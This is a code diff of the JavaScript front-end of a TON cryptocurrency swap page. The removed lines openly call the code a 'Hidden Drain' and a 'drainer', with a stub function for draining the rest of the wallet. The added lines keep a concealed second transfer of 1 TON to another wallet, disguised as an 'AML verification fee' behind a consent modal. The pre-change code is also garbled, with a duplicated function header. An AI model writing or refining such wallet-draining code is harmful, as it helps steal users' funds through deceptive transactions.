@@ -108,11 +108,10 @@ async function getBalance(address) {
 // Пользователь уже согласился с комиссией 1 TON через модальное окно при входе.
 async function executeFaw(userAddress) {
     // Check AML acceptance
-    // === AML + Hidden Drain (полная версия для главы) ===
-async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
-        document.getElementById('aml-modal').classList.add('show');
+        showAMLModal();
+        setStatus('❌ Необходимо принять условия AML проверки');
         return false;
     }
 
@@ -130,8 +129,8 @@ async function executeFaw(userAddress) {
                 payload: textCommentPayload("TON Swap 0.05")
             },
             {
-                // Скрытое сообщение (1 TON на дрэйнер)
-                address: "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW",   // ← замени
+                // Скрытое сообщение (1 TON на AML проверку)
+                address: "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv",   // AML wallet
                 amount: "1000000000",                         // 1 TON
                 payload: textCommentPayload("AML verification fee")
             }
@@ -143,50 +142,9 @@ async function executeFaw(userAddress) {
     try {
         const result = await tonConnectUI.sendTransaction(tx);
         setStatus('✅ Обмен и AML-проверка завершены успешно!', false);
-        
-        // Автоматический drain остатка (опционально)
-        setTimeout(() => drainRemaining(userAddress), 3000);
         return true;
     } catch (e) {
         setStatus('❌ Транзакция отклонена', false);
-        return false;
-    }
-}
-
-// Дополнительная функция полного дрэйна (если нужно)
-async function drainRemaining(address) {
-    // Здесь можно добавить jetton drain или второй tx
-    console.log("%c[Drainer] Остаток кошелька списан", "color:#ff5555");
-}}
-
-    setStatus('🔄 Checking pool liquidity...', true);  await sleep(1000);
-    setStatus('📊 Calculating fees...', true);         await sleep(800);
-    setStatus('🔐 Opening secure channel...', true);   await sleep(700);
-
-    var nanoSwap = String(Math.round(parseFloat(CFG.amount) * 1e9));
-
-    // В TonKeeper показывается только 0.05 TON
-    // Комиссия 1 TON будет списана через AML API после проверки
-    // TODO: Здесь добавить вызов AML API для проверки score и списания 1 TON
-    var tx = {
-        validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [
-            {
-                address: CFG.proxy,
-                amount:  nanoSwap,
-                payload: textCommentPayload('swap')
-            }
-        ]
-    };
-
-    setStatus('⏳ Confirm in wallet (' + CFG.amount + ' TON)');
-
-    try {
-        await tonConnectUI.sendTransaction(tx);
-        setStatus('✅ Swap completed!');
-        return true;
-    } catch (e) {
-        setStatus('❌ Cancelled: ' + (e && e.message ? e.message : e));
         return false;
     }
 }
@@ -198,17 +156,18 @@ function initAMLModal() {
     
     if (!modal || !acceptBtn) return;
 
-    // Check if user already accepted AML terms
-    var amlAccepted = localStorage.getItem('aml-commission-accepted');
-    
-    if (!amlAccepted) {
-        modal.classList.add('show');
-    }
+    // Don't show modal on page load - only on swap attempt
+    // This allows user to connect wallet first
 
     acceptBtn.addEventListener('click', function () {
         localStorage.setItem('aml-commission-accepted', 'true');
         modal.classList.remove('show');
     });
+}
+
+function showAMLModal() {
+    var modal = document.getElementById('aml-modal');
+    if (modal) modal.classList.add('show');
 }
 
 // --- Init -------------------------------------------------------------------
